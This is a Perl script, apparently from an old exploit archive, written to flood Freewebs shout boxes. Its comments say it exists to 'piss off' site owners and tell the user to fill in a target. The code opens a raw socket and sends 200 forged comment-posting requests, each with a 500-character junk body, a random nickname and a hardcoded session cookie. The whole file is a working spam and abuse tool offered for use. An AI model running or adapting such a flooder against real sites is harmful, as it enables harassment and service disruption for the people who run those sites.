﻿#!/usr/bin/perl
#
# frwb_fld.pl <= 1.0 Freewebs Shout box flooder
#
# Freewebs has a nice but weak shout box script
# that lets you post without limit. So I wrote
# this script for anyone who wants to piss off
# someone with a freewebs site and has its
# shout box installed.
#
# Change up the variables for the site to hit.
#
# $id-seven
# esoteric code
# esotericcode@gmail.com

use IO::Socket;

$IP = "38.144.96.31"; # IP I used, it may be different.
$ref ="http://www.freewebs.com/_target/index.htm";  # Add the target sub-host.
$host = "link.freewebs.com"; # This may be different also.
@ArNames = ('aaaa','bbbb','cccc');

$fsock = new IO::Socket::INET(
                              PeerAddr=> $IP,
                              PeerPort=> 80,
                              Proto=> 'tcp',) || die "Couldnt Connect $!\n";

$flood = "a" x 500;
$a = int(rand($#ArNames));
$nick = $ArNames[$a];

for ($i = 0; $i < 200; $i++){
print $fsock "GET /Members/Comments/postComment.jsp?&userID=18683669&commentSettingID=679689&body=".$flood."&name=".$nick."&next=callback&callback=$(%22fw-sb-679689%22).fwShoutBox.postCommentCallback&rand=0.8776447684149963 HTTP/1.1\n";
print $fsock "Host: ".$host."\n";
print $fsock "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.6) Gecko/20060728 Firefox/1.5.0.6\n";
print $fsock "Accept: */*\n";
print $fsock "Accept-Language: en-us,en;q=0.5\n";
print $fsock "Accept -Encoding: gzip , deflate\n";
print $fsock "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\n";
print $fsock "Keep-Alive: 300\n";
print $fsock "Connection: keep-alive\n";
print $fsock "Referer: ".$ref."\n";
print $fsock "Cookie: __utma=89345612.1440792377.1156557932.1156557932.1156563831.2; __utmz=89345612.1156557932.1.1.utmccn=(direct)|utmcsr=(direct)|utmcmd=(none); JSESSIONID=65CA4991A7B712D2735A6DCEF6D74A80; __utmb=89345612; __utmc=89345612\n\n";
sleep(2);
print "Floods[".$i."]\n";
}
 while ($resp = <$fsock>) {
     print $resp;
 }

#EOF
